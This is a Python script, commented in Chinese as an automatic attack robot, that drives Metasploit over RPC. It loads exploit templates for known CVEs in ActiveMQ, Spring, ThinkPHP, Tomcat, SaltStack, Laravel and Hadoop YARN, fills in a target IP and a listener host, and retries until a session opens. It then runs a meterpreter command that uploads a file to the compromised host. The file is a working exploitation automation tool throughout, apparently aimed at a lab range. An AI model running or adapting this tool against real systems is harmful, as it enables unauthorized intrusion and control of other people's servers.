import time

from pymetasploit3.msfrpc import MsfRpcClient

from py_config import ConfigFactory
from py_logging import LoggerFactory

# 自动攻击机器人


class MetasploitClient():
    # 初始化
    def __init__(self, config, logger) -> None:
        self.config = config
        self.logger = logger
        # msf连接参数
        self.msfserver = self.config.get('metasploit', 'msfserver')
        self.msfport = self.config.get('metasploit', 'port')
        self.msfusername = self.config.get('metasploit', 'username')
        self.msfpassword = self.config.get('metasploit', 'password')
        self.current_attack_num = 1

    # 加载攻击文本
    def load_script(self, script_name: str, target_ip: str, target_port: int) -> str:
        script_name = self.config.get(
            'vuls', 'path')+'/%s' % (script_name+'.txt')
        data = ''
        with open(script_name, 'r') as script_file:
            lines = script_file.readlines()
            for line in lines:
                data = data+line
            data = data.replace('#rhosts#', target_ip).replace(
                '#rport#', str(target_port)).replace('#lhost#', self.config.get('kali', 'hostname'))
            self.logger.info(data)
        return data

    # 执行攻击脚本
    def attack(self, attack_script: str):

        # 初始化client
        self.client = MsfRpcClient(user=self.msfusername, password=self.msfpassword,
                                   server=self.msfserver, port=self.msfport)

        # 初始化console
        cid = self.client.consoles.console().cid
        self.console = self.client.consoles.console(cid=cid)
        self.console.read()

        self.console.write(attack_script)

        # 获取结果
        result = ''
        while result == '' or self.console.is_busy():
            time.sleep(1)
            result += self.console.read()['data']
        print(result)

        # 递归攻击
        while (('Exploit completed, but no session was created.' in result) or ('target may not be vulnerable.' in result)) and (self.current_attack_num < 3):
            self.current_attack_num = self.current_attack_num+1
            print('====retry '+str(self.current_attack_num)+'====')
            self.attack(attack_script=attack_script)

        # 判断是否攻击成功
        if ' created in the background.' in result:
            status = 'success'
        else:
            status = 'failure'

        # 返回结果
        return status, result

    # 执行meterpreter指令
    def meterpreter(self):
        # 获取sessionid
        sids = []
        for key in self.client.sessions.list.keys():
            sids.append(key)

        if len(sids) > 0:
            # 获取session
            self.session = self.client.sessions.session(sid=sids[0])

        # 执行攻击后指令
        meterpreter_cmd = 'upload /home/kali/success /tmp/igot'
        end_strs = '/home/kali/success -> /tmp/igot'
        result = self.session.run_with_output(
            cmd=meterpreter_cmd, end_strs=end_strs)

        if 'uploaded   : /home/kali/success -> /tmp/igot' in result:
            status = 'success'
        else:
            status = 'failure'

        # 关闭所有已经打开的session
        self.console.write('sessions -K')

        # 销毁console
        self.console.destroy()

        # 返回
        return status, result


if __name__ == '__main__':
    config = ConfigFactory(config_file='py_robot2022.ini').get_config()
    logger = LoggerFactory(config_factory=config).get_logger()

    script_name = 'py_hadoop_unauthorized-yarn'
    script_name = 'py_activemq_cve-2016-3088'
    # script_name = 'py_spring_cve-2022-22963'
    # script_name = 'py_thinkphp_cve-2019-9082'
    # script_name = 'py_tomcat_cve-2020-1938'
    # script_name = 'py_saltstack_cve-2020-11651'
    # script_name = 'py_laravel_cve-2021-3129'
    metasploit_client = MetasploitClient(config=config, logger=logger)
    attack_script = metasploit_client.load_script(
        script_name=script_name, target_ip='172.27.100.110', target_port='18080')
    status, result = metasploit_client.attack(attack_script=attack_script)
    # if status == 'success':
    #     status, result = metasploit_client.meterpreter()
    # else:
    #     logger.debug('failure')
    # print(status, result)
